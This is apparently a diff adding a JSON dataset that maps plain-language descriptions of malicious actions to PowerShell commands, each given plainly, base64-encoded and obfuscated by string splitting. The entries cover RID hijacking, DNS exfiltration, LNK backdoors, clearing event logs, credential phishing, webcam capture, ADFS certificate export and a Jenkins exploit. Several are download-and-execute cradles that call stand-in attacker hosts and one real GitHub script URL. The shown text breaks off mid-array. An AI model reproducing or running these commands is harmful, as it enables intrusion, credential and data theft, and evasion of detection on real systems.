@@ -1,0 +1,906 @@
+[
+  {
+    "input": "Perform RID Hijacking using the guest account with RID 1001 and specified password.",
+    "outputs": [
+      "Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1",
+      "powershell -enc SQBuAHYAbwBrAGUALQBSAEkARABIAGkAagBhAGMAawBpAG4AZwAgAC0AVQBzAGUARwB1AGUAcwB0ACAALQBSAEkARAAgADEAMAAwADEAIAAtAFAAYQBzAHMAdwBvAHIAZAAgAFAAYQBzAHMAdwBvAHIAZAAxAA==",
+      "IEX('In''+''vo''+''ke''+''-R''+''ID''+''Hi''+''ja''+''ck''+''in''+''g ''+''-U''+''se''+''Gu''+''es''+''t ''+''-R''+''ID''+'' 1''+''00''+''1 ''+''-P''+''as''+''sw''+''or''+''d ''+''Pa''+''ss''+''wo''+''rd''+''1')"
+    ]
+  },
+  {
+    "input": "Import a PowerShell module and use it to exfiltrate data via DNS.",
+    "outputs": [
+      "Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding}",
+      "powershell -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAewBwAHMAXwBtAG8AZAB1AGwAZQB9ACAAOwAgAEkAbgB2AG8AawBlAC0ARABOAFMARQB4AGYAaQBsAHQAcgBhAHQAbwByACAALQBpACAAJAB7AHAAcwBfAG0AbwBkAHUAbABlAH0AIAAtAGQAIAAkAHsAZABvAG0AYQBpAG4AfQAgAC0AcAAgACQAewBwAGEAcwBzAHcAbwByAGQAfQAgAC0AZABvAGgAIAAkAHsAZABvAGgAfQAgAC0AdAAgACQAewB0AGkAbQBlAH0AIAAkAHsAZQBuAGMAbwBkAGkAbgBnAH0A",
+      "IEX('Im''+''po''+''rt''+''-M''+''od''+''ul''+''e ''+''${''+''ps''+''_m''+''od''+''ul''+''e}''+'' ;''+'' I''+''nv''+''ok''+''e-''+''DN''+''SE''+''xf''+''il''+''tr''+''at''+''or''+'' -''+''i ''+''${''+''ps''+''_m''+''od''+''ul''+''e}''+'' -''+''d ''+''${''+''do''+''ma''+''in''+''} ''+''-p''+'' $''+''{p''+''as''+''sw''+''or''+''d}''+'' -''+''do''+''h ''+''${''+''do''+''h}''+'' -''+''t ''+''${''+''ti''+''me''+''} ''+''${''+''en''+''co''+''di''+''ng''+''}')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell script with specific execution policy and hidden window style.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBOAG8ATABvAGcAbwAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEYAaQBsAGUAIABtAGEAbABpAGMAaQBvAHUAcwAuAHAAcwAxAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''No''+''Lo''+''go''+'' -''+''No''+''nI''+''nt''+''er''+''ac''+''ti''+''ve''+'' -''+''No''+''Pr''+''of''+''il''+''e ''+''-W''+''in''+''do''+''wS''+''ty''+''le''+'' H''+''id''+''de''+''n ''+''-F''+''il''+''e ''+''ma''+''li''+''ci''+''ou''+''s.''+''ps''+''1')"
+    ]
+  },
+  {
+    "input": "Invoke compiled HTML Help (CHM) file with specific storage handler, HH file path, and CHM file path.",
+    "outputs": [
+      "Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}",
+      "powershell -enc SQBuAHYAbwBrAGUALQBBAFQASABDAG8AbQBwAGkAbABlAGQASABlAGwAcAAgAC0ASQBuAGYAbwBUAGUAYwBoAFMAdABvAHIAYQBnAGUASABhAG4AZABsAGUAcgAgACQAewBpAG4AZgBvAHQAZQBjAGgAXwBzAHQAbwByAGEAZwBlAF8AaABhAG4AZABsAGUAcgB9ACAALQBIAEgARgBpAGwAZQBQAGEAdABoACAAJAB7AGgAaABfAGYAaQBsAGUAXwBwAGEAdABoAH0AIAAtAEMASABNAEYAaQBsAGUAUABhAHQAaAAgACQAewBjAGgAbQBfAGYAaQBsAGUAXwBwAGEAdABoAH0A",
+      "IEX('In''+''vo''+''ke''+''-A''+''TH''+''Co''+''mp''+''il''+''ed''+''He''+''lp''+'' -''+''In''+''fo''+''Te''+''ch''+''St''+''or''+''ag''+''eH''+''an''+''dl''+''er''+'' $''+''{i''+''nf''+''ot''+''ec''+''h_''+''st''+''or''+''ag''+''e_''+''ha''+''nd''+''le''+''r}''+'' -''+''HH''+''Fi''+''le''+''Pa''+''th''+'' $''+''{h''+''h_''+''fi''+''le''+''_p''+''at''+''h}''+'' -''+''CH''+''MF''+''il''+''eP''+''at''+''h ''+''${''+''ch''+''m_''+''fi''+''le''+''_p''+''at''+''h}')"
+    ]
+  },
+  {
+    "input": "Invoke a backdoor through a shortcut (LNK) file and perform cleanup.",
+    "outputs": [
+      "Invoke-BackdoorLNK -LNKPath C:\\Users\\john\\Desktop\\Firefox.lnk -CleanUp",
+      "powershell -enc SQBuAHYAbwBrAGUALQBCAGEAYwBrAGQAbwBvAHIATABOAEsAIAAtAEwATgBLAFAAYQB0AGgAIABDADoAXABVAHMAZQByAHMAXABqAG8AaABuAFwARABlAHMAawB0AG8AcABcAEYAaQByAGUAZgBvAHgALgBsAG4AawAgAC0AQwBsAGUAYQBuAFUAcAA=",
+      "IEX('In''+''vo''+''ke''+''-B''+''ac''+''kd''+''oo''+''rL''+''NK''+'' -''+''LN''+''KP''+''at''+''h ''+''C:''+''\\U''+''se''+''rs''+''\\j''+''oh''+''n\\''+''De''+''sk''+''to''+''p\\''+''Fi''+''re''+''fo''+''x.''+''ln''+''k ''+''-C''+''le''+''an''+''Up')"
+    ]
+  },
+  {
+    "input": "Clear event logs on the system.",
+    "outputs": [
+      "$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list",
+      "powershell -enc JABsAG8AZwBzACAAPQAgAEcAZQB0AC0ARQB2AGUAbgB0AEwAbwBnACAALQBMAGkAcwB0ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAJAAuAEwAbwBnAH0AIAA7ACAAJABsAG8AZwBzACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAQwBsAGUAYQByAC0ARQB2AGUAbgB0AEwAbwBnACAALQBMAG8AZwBOAGEAbQBlACAAJAAgAH0AIAA7ACAARwBlAHQALQBFAHYAZQBuAHQATABvAGcAIAAtAGwAaQBzAHQA",
+      "IEX('$l''+''og''+''s ''+''= ''+''Ge''+''t-''+''Ev''+''en''+''tL''+''og''+'' -''+''Li''+''st''+'' |''+'' F''+''or''+''Ea''+''ch''+''-O''+''bj''+''ec''+''t ''+''{$''+''.L''+''og''+''} ''+''; ''+''$l''+''og''+''s ''+''| ''+''Fo''+''rE''+''ac''+''h-''+''Ob''+''je''+''ct''+'' {''+''Cl''+''ea''+''r-''+''Ev''+''en''+''tL''+''og''+'' -''+''Lo''+''gN''+''am''+''e ''+''$ ''+''} ''+''; ''+''Ge''+''t-''+''Ev''+''en''+''tL''+''og''+'' -''+''li''+''st')"
+    ]
+  },
+  {
+    "input": "Execute a command using PsExec, updating a trace session with specified parameters.",
+    "outputs": [
+      "cmd /c \"${ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"${session}\" --p \"${provider}\" -ets",
+      "powershell -enc YwBtAGQAIAAvAGMAIAAiACQAewBwAHMAXwBlAHgAZQBjAF8AbABvAGMAYQB0AGkAbwBuAH0AIgAgAC0AYQBjAGMAZQBwAHQAZQB1AGwAYQAgAC0AaQAgAC0AcwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIABsAG8AZwBtAGEAbgAgAHUAcABkAGEAdABlACAAdAByAGEAYwBlACAAIgAkAHsAcwBlAHMAcwBpAG8AbgB9ACIAIAAtAC0AcAAgACIAJAB7AHAAcgBvAHYAaQBkAGUAcgB9ACIAIAAtAGUAdABzAA==",
+      "IEX('cm''+''d ''+''/c''+'' \"''+''${''+''ps''+''_e''+''xe''+''c_''+''lo''+''ca''+''ti''+''on''+''}\"''+'' -''+''ac''+''ce''+''pt''+''eu''+''la''+'' -''+''i ''+''-s''+'' c''+''md''+''.e''+''xe''+'' /''+''c ''+''lo''+''gm''+''an''+'' u''+''pd''+''at''+''e ''+''tr''+''ac''+''e ''+''\"$''+''{s''+''es''+''si''+''on''+''}\"''+'' -''+''-p''+'' \"''+''${''+''pr''+''ov''+''id''+''er''+''}\"''+'' -''+''et''+''s')"
+    ]
+  },
+  {
+    "input": "Invoke a credential phishing attack.",
+    "outputs": [
+      "Invoke-CredentialPhisher",
+      "powershell -enc SQBuAHYAbwBrAGUALQBDAHIAZQBkAGUAbgB0AGkAYQBsAFAAaABpAHMAaABlAHIA",
+      "IEX('In''+''vo''+''ke''+''-C''+''re''+''de''+''nt''+''ia''+''lP''+''hi''+''sh''+''er')"
+    ]
+  },
+  {
+    "input": "Download a file and save it to the temporary directory.",
+    "outputs": [
+      "$x=\"$env:temp\\jxm.exe\";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",
+      "powershell -enc JAB4AD0AIgAkAGUAbgB2ADoAdABlAG0AcABcAGoAeABtAC4AZQB4AGUAIgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAB1AHIAbAAuAGMAbwBtAC8AJwApAA==",
+      "IEX('$x''+''=\"''+''$e''+''nv''+'':t''+''em''+''p\\''+''jx''+''m.''+''ex''+''e\"''+'';(''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' S''+''ys''+''te''+''m.''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dF''+''il''+''e(''+'''h''+''tt''+''p:''+''//''+''ev''+''il''+''ur''+''l.''+''co''+''m/''+''')')"
+    ]
+  },
+  {
+    "input": "Create and execute a PowerShell process with a malicious payload encoded in Base64.",
+    "outputs": [
+      "$payload = [System.Text.Encoding]::UTF8.GetBytes(\"<malicious payload>\"); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = \"powershell.exe\"; $process.StartInfo.Arguments = \"-ExecutionPolicy Bypass -NoProfile -EncodedCommand \" + [Convert]::ToBase64String($payload); $process.Start()",
+      "powershell -enc JABwAGEAeQBsAG8AYQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAiADwAbQBhAGwAaQBjAGkAbwB1AHMAIABwAGEAeQBsAG8AYQBkAD4AIgApADsAIAAkAHAAcgBvAGMAZQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwA7ACAAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBGAGkAbABlAE4AYQBtAGUAIAA9ACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgA7ACAAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAiAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgACIAIAArACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApADsAIAAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApAA==",
+      "IEX('$p''+''ay''+''lo''+''ad''+'' =''+'' [''+''Sy''+''st''+''em''+''.T''+''ex''+''t.''+''En''+''co''+''di''+''ng''+'']:''+'':U''+''TF''+''8.''+''Ge''+''tB''+''yt''+''es''+''(\"''+''<m''+''al''+''ic''+''io''+''us''+'' p''+''ay''+''lo''+''ad''+''>\"''+'');''+'' $''+''pr''+''oc''+''es''+''s ''+''= ''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' S''+''ys''+''te''+''m.''+''Di''+''ag''+''no''+''st''+''ic''+''s.''+''Pr''+''oc''+''es''+''s;''+'' $''+''pr''+''oc''+''es''+''s.''+''St''+''ar''+''tI''+''nf''+''o.''+''Fi''+''le''+''Na''+''me''+'' =''+'' \"''+''po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+''\";''+'' $''+''pr''+''oc''+''es''+''s.''+''St''+''ar''+''tI''+''nf''+''o.''+''Ar''+''gu''+''me''+''nt''+''s ''+''= ''+''\"-''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''No''+''Pr''+''of''+''il''+''e ''+''-E''+''nc''+''od''+''ed''+''Co''+''mm''+''an''+''d ''+''\" ''+''+ ''+''[C''+''on''+''ve''+''rt''+'']:''+'':T''+''oB''+''as''+''e6''+''4S''+''tr''+''in''+''g(''+''$p''+''ay''+''lo''+''ad''+'');''+'' $''+''pr''+''oc''+''es''+''s.''+''St''+''ar''+''t(''+'')')"
+    ]
+  },
+  {
+    "input": "Invoke a PowerShell command on a remote system.",
+    "outputs": [
+      "Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> }",
+      "powershell -enc SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgADwAUgBlAG0AbwB0AGUAUwB5AHMAdABlAG0APgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAewAgADwAUABvAHcAZQByAHMAaABlAGwAbAAgAEMAbwBtAG0AYQBuAGQAPgAgAH0A",
+      "IEX('In''+''vo''+''ke''+''-C''+''om''+''ma''+''nd''+'' -''+''Co''+''mp''+''ut''+''er''+''Na''+''me''+'' <''+''Re''+''mo''+''te''+''Sy''+''st''+''em''+''> ''+''-S''+''cr''+''ip''+''tB''+''lo''+''ck''+'' {''+'' <''+''Po''+''we''+''rs''+''he''+''ll''+'' C''+''om''+''ma''+''nd''+''> ''+''}')"
+    ]
+  },
+  {
+    "input": "Invoke PowerShell expression to download and execute a script from a specified URL.",
+    "outputs": [
+      "Invoke-Expression -Command \"IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')\"",
+      "powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AaABhAGMAawBlAHIALgBjAG8AbQAvAGIAYQBkAC4AcABzADEAJwApACIA",
+      "IEX('In''+''vo''+''ke''+''-E''+''xp''+''re''+''ss''+''io''+''n ''+''-C''+''om''+''ma''+''nd''+'' \"''+''IE''+''X(''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/h''+''ac''+''ke''+''r.''+''co''+''m/''+''ba''+''d.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Start recording webcam for a specified duration and save the video to a specified path.",
+    "outputs": [
+      "Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\\webcam.mov'",
+      "powershell -enc UwB0AGEAcgB0AC0AVwBlAGIAYwBhAG0AUgBlAGMAbwByAGQAZQByACAALQBSAGUAYwBvAHIAZABUAGkAbQBlACAAMgAwACAALQBPAHUAdABQAGEAdABoACAAJwBDADoAXAB3AGUAYgBjAGEAbQAuAG0AbwB2ACcA",
+      "IEX('St''+''ar''+''t-''+''We''+''bc''+''am''+''Re''+''co''+''rd''+''er''+'' -''+''Re''+''co''+''rd''+''Ti''+''me''+'' 2''+''0 ''+''-O''+''ut''+''Pa''+''th''+'' '''+''C:''+''\\w''+''eb''+''ca''+''m.''+''mo''+''v'')"
+    ]
+  },
+  {
+    "input": "Execute a malicious PowerShell command to download and execute a script from a specified URL.",
+    "outputs": [
+      "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMAdwBlAGIAcwBpAHQAZQAuAGMAbwBtAC8AbQBhAGwAaQBjAGkAbwB1AHMAcwBjAHIAaQBwAHQALgBwAHMAMQAnACkAIgA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+'' -''+''c ''+''\"I''+''EX''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/m''+''al''+''ic''+''io''+''us''+''we''+''bs''+''it''+''e.''+''co''+''m/''+''ma''+''li''+''ci''+''ou''+''ss''+''cr''+''ip''+''t.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Import a module, export ADFS certificates, filter files, and display success message.",
+    "outputs": [
+      "Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"} ; Write-Host \"`nCertificates retrieved successfully\"",
+      "powershell -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEEAQQBEAEkAbgB0AGUAcgBuAGEAbABzACAALQBGAG8AcgBjAGUAIAA7ACAARQB4AHAAbwByAHQALQBBAEEARABJAG4AdABBAEQARgBTAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAgAC0AbABpAGsAZQAgACIAQQBEAEYAUwAqACIAfQAgADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBgAG4AQwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAByAGUAdAByAGkAZQB2AGUAZAAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACIA",
+      "IEX('Im''+''po''+''rt''+''-M''+''od''+''ul''+''e ''+''AA''+''DI''+''nt''+''er''+''na''+''ls''+'' -''+''Fo''+''rc''+''e ''+''; ''+''Ex''+''po''+''rt''+''-A''+''AD''+''In''+''tA''+''DF''+''SC''+''er''+''ti''+''fi''+''ca''+''te''+''s ''+''; ''+''Ge''+''t-''+''Ch''+''il''+''dI''+''te''+''m ''+''| ''+''Wh''+''er''+''e-''+''Ob''+''je''+''ct''+'' {''+''$_''+'' -''+''li''+''ke''+'' \"''+''AD''+''FS''+''*\"''+''} ''+''; ''+''Wr''+''it''+''e-''+''Ho''+''st''+'' \"''+''`n''+''Ce''+''rt''+''if''+''ic''+''at''+''es''+'' r''+''et''+''ri''+''ev''+''ed''+'' s''+''uc''+''ce''+''ss''+''fu''+''ll''+''y\"')"
+    ]
+  },
+  {
+    "input": "Execute a hidden PowerShell command with a Base64-encoded payload.",
+    "outputs": [
+      "powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBuAG8AbgBpACAALQBlAG4AYwAgADwAQgBhAHMAZQA2ADQAIABFAG4AYwBvAGQAZQBkACAAQwBvAG0AbQBhAG4AZAA+AA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''no''+''p ''+''-w''+'' h''+''id''+''de''+''n ''+''-n''+''on''+''i ''+''-e''+''nc''+'' <''+''Ba''+''se''+''64''+'' E''+''nc''+''od''+''ed''+'' C''+''om''+''ma''+''nd''+''>')"
+    ]
+  },
+  {
+    "input": "Invoke Expression to download and execute an obfuscated PowerShell script from a GitHub repository.",
+    "outputs": [
+      "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
+      "powershell -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAEMAcgBlAGQAcwAvAG0AYQBzAHQAZQByAC8AbwBiAGYAdQBzAGMAYQB0AGUAZABwAHMALwBkAGMAYwB1AGEAYwAuAHAAcwAxACcAKQA=",
+      "IEX('ie''+''x(''+''ne''+''w-''+''ob''+''je''+''ct''+'' n''+''et''+''.w''+''eb''+''cl''+''ie''+''nt''+'').''+''do''+''wn''+''lo''+''ad''+''st''+''ri''+''ng''+''('''+''ht''+''tp''+''s:''+''//''+''ra''+''w.''+''gi''+''th''+''ub''+''us''+''er''+''co''+''nt''+''en''+''t.''+''co''+''m/''+''S3''+''cu''+''r3''+''Th''+''1s''+''Sh''+''1t''+''/C''+''re''+''ds''+''/m''+''as''+''te''+''r/''+''ob''+''fu''+''sc''+''at''+''ed''+''ps''+''/d''+''cc''+''ua''+''c.''+''ps''+''1'''+'')')"
+    ]
+  },
+  {
+    "input": "List files recursively using different aliases of the Get-ChildItem cmdlet.",
+    "outputs": [
+      "ls -recurse ; get-childitem -recurse ; gci -recurse",
+      "powershell -enc bABzACAALQByAGUAYwB1AHIAcwBlACAAOwAgAGcAZQB0AC0AYwBoAGkAbABkAGkAdABlAG0AIAAtAHIAZQBjAHUAcgBzAGUAIAA7ACAAZwBjAGkAIAAtAHIAZQBjAHUAcgBzAGUA",
+      "IEX('ls''+'' -''+''re''+''cu''+''rs''+''e ''+''; ''+''ge''+''t-''+''ch''+''il''+''di''+''te''+''m ''+''-r''+''ec''+''ur''+''se''+'' ;''+'' g''+''ci''+'' -''+''re''+''cu''+''rs''+''e')"
+    ]
+  },
+  {
+    "input": "Execute a hidden PowerShell command with a script downloaded from a specified website.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')}",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBOAG8ATABvAGcAbwAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAB7AGkAZQB4ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AWwBtAGEAbABpAGMAaQBvAHUAcwBfAHcAZQBiAHMAaQB0AGUAXQAvAG0AYQBsAGkAYwBpAG8AdQBzAF8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkAfQA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''No''+''Lo''+''go''+'' -''+''No''+''nI''+''nt''+''er''+''ac''+''ti''+''ve''+'' -''+''No''+''Pr''+''of''+''il''+''e ''+''-W''+''in''+''do''+''wS''+''ty''+''le''+'' H''+''id''+''de''+''n ''+''-C''+''om''+''ma''+''nd''+'' {''+''ie''+''x ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Sy''+''st''+''em''+''.N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/[''+''ma''+''li''+''ci''+''ou''+''s_''+''we''+''bs''+''it''+''e]''+''/m''+''al''+''ic''+''io''+''us''+''_s''+''cr''+''ip''+''t.''+''ps''+''1'''+'')}')"
+    ]
+  },
+  {
+    "input": "Exploit Jenkins server with specified host and port, running a command to display network statistics.",
+    "outputs": [
+      "Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an'",
+      "powershell -enc RQB4AHAAbABvAGkAdAAtAEoAZQBuAGsAaQBuAHMAIAAtAFIAaABvAHMAdAAgADEAMgA3AC4AMAAuADAALgAxACAALQBQAG8AcgB0ACAAOAAwADgAMAAgAC0AQwBtAGQAIAAnAGMAbQBkACAALwBjACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuACcA",
+      "IEX('Ex''+''pl''+''oi''+''t-''+''Je''+''nk''+''in''+''s ''+''-R''+''ho''+''st''+'' 1''+''27''+''.0''+''.0''+''.1''+'' -''+''Po''+''rt''+'' 8''+''08''+''0 ''+''-C''+''md''+'' '''+''cm''+''d ''+''/c''+'' n''+''et''+''st''+''at''+'' -''+''an''+'''')"
+    ]
+  },
+  {
+    "input": "Download and execute a script using Invoke-Command with a defined script block.",
+    "outputs": [
+      "$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke",
+      "powershell -enc JABJAG4AdgBvAGsAZQAgAD0AIAB7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AdQByAGwALwBtAGEAbABpAGMAaQBvAHUAcwBfAHMAYwByAGkAcAB0AC4AcABzADEAJwApAH0AOwAgAEkAbgB2AG8AawBlAC0AQwBvAG0AbQBhAG4AZAAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABJAG4AdgBvAGsAZQA=",
+      "IEX('$I''+''nv''+''ok''+''e ''+''= ''+''{I''+''EX''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/m''+''al''+''ic''+''io''+''us''+''.u''+''rl''+''/m''+''al''+''ic''+''io''+''us''+''_s''+''cr''+''ip''+''t.''+''ps''+''1'''+'')}''+''; ''+''In''+''vo''+''ke''+''-C''+''om''+''ma''+''nd''+'' -''+''Sc''+''ri''+''pt''+''Bl''+''oc''+''k ''+''$I''+''nv''+''ok''+''e')"
+    ]
+  },
+  {
+    "input": "Invoke a web request to download a potentially unwanted application (PUA) and execute it.",
+    "outputs": [
+      "Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & \"${pua_file}\"",
+      "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJAB7AHAAdQBhAF8AdQByAGwAfQAgAC0ATwB1AHQARgBpAGwAZQAgACQAewBwAHUAYQBfAGYAaQBsAGUAfQAgADsAIAAmACAAIgAkAHsAcAB1AGEAXwBmAGkAbABlAH0AIgA=",
+      "IEX('In''+''vo''+''ke''+''-W''+''eb''+''Re''+''qu''+''es''+''t ''+''${''+''pu''+''a_''+''ur''+''l}''+'' -''+''Ou''+''tF''+''il''+''e ''+''${''+''pu''+''a_''+''fi''+''le''+''} ''+''; ''+''& ''+''\"$''+''{p''+''ua''+''_f''+''il''+''e}''+''\"')"
+    ]
+  },
+  {
